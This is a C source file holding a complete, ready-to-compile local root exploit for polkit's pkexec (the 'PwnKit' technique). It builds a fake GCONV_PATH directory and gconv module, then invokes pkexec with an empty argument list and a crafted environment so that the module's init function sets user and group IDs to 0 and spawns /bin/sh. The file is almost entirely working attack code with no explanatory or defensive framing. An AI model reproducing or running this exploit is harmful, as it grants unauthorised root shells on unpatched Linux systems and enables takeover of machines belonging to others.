#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>


// Specify path to linker.
const char interp[] __attribute__((section(".interp"))) = \
    "/lib64/ld-linux-x86-64.so.2";

// Ensure shared object classifies as gconv module.
void gconv() {
    return;
}

void gconv_init() {
    static char *argv[] = {"sh", NULL};
    static char *envp[] = {"PATH=/bin:/sbin:/usr/bin/usr/sbin", NULL};

    setuid(0); seteuid(0); setgid(0); setegid(0);
    execve("/bin/sh", argv, envp);
    exit(0);
}

void die(char *msg) {
    fprintf(stderr, "[-] %s\n", msg);
    exit(-1);
}

int pkexec_installed() {
    struct stat st;

    if ((stat("/usr/bin/pkexec", &st) != -1) && (S_ISREG(st.st_mode) != 0)) {
        if ((st.st_mode &(S_IXUSR | S_IXGRP | S_IXOTH)) == 0)
            return -1;
        else
            return 0;
    }

    return -1;
}

void init_gconv_path() {
    FILE *fp = fopen("pwnkit/gconv-modules", "wb");
    if(fp == NULL)
        die("Failed to create pwnkit/gconv-modules");

    fprintf(fp, "module UTF-8// INTERNAL ../pwnkit 1\n");
    fclose(fp);
}

// Ensure vulnerable code path is triggered.
void setup_preconditions() {
    struct stat st;

    if (stat("GCONV_PATH=.", &st) < 0) {
        if(mkdir("GCONV_PATH=.", 0755) < 0)
            die("Failed to create GCONV_PATH=. directory");

        int fd = open("GCONV_PATH=./pwnkit", O_CREAT|O_RDWR, 0755);
        if (fd < 0)
            die("Failed to create GCONV_PATH=./pwnkit");

        close(fd);
    }

    if (stat("pwnkit", &st) < 0) {
        if(mkdir("pwnkit", 0755) < 0)
            die("Failed to create pwnkit directory");

        init_gconv_path();
    }
}

void get_shell() {
    char *argv[]={NULL};
    char *envp[]={
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "SHELL=pwnkit",
        "GIO_USE_VFS=",
        "LC_MESSAGES=en_US.UTF-8",
        NULL
    };

    execve("/usr/bin/pkexec", argv, envp);
}

int main(int argc, char *argv[]) {
    if (pkexec_installed() < 0)
        die("Failed to find executable pkexec binary");

    setup_preconditions();
    get_shell();

    return 0;
}
